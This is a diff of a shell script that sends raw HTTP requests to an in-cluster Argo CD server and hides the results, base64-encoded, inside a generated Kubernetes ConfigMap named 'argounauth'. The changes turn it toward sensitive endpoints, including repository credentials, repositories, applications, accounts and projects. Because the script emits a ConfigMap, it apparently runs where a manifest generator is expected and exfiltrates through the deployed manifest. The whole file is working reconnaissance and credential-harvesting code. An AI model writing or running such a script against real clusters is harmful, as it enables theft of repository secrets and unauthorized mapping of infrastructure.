@@ -1,38 +1,41 @@
 #!/bin/sh
 RECON=$( (
-  echo "===ARGOCD_API_VERSION==="
-  printf "GET /api/version HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null
+  echo "===ARGOCD_STREAM==="
+  printf "GET /api/v1/stream/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===ARGOCD_SWAGGER==="
-  printf "GET /swagger.json HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 500
+  echo "===ARGOCD_REPOS==="
+  printf "GET /api/v1/repositories HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===ARGOCD_API==="
-  printf "GET / HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:80 -quiet 2>/dev/null
+  echo "===ARGOCD_REPOCREDS==="
+  printf "GET /api/v1/repocreds HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===ARGOCD_SETTINGS==="
-  printf "GET /api/v1/settings HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
+  echo "===ARGOCD_APPLICATIONS==="
+  printf "GET /api/v1/applications HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===ARGOCD_CLUSTER_INFO==="
-  printf "GET /api/v1/clusters HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
+  echo "===ARGOCD_ACCOUNT==="
+  printf "GET /api/v1/account HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===ARGOCD_ACCOUNT_PASSWORD==="
-  printf "GET /api/v1/account/password HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 500
+  echo "===ARGOCD_PROJECTS==="
+  printf "GET /api/v1/projects HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 
   echo ""
-  echo "===CURL_ARGOCD==="
-  # Try from localhost perspective
-  curl -k -s https://argocd-server.argocd.svc.cluster.local/api/v1/settings 2>&1 | head -c 500 || echo "curl_failed"
+  echo "===ARGOCD_INFO==="
+  printf "GET /api/v1/info HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
+
+  echo ""
+  echo "===ARGOCD_SSO==="
+  printf "GET /auth/login HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -c 1000
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: argocdapi
+  name: argounauth
 data:
   result: $RECON
 EOF
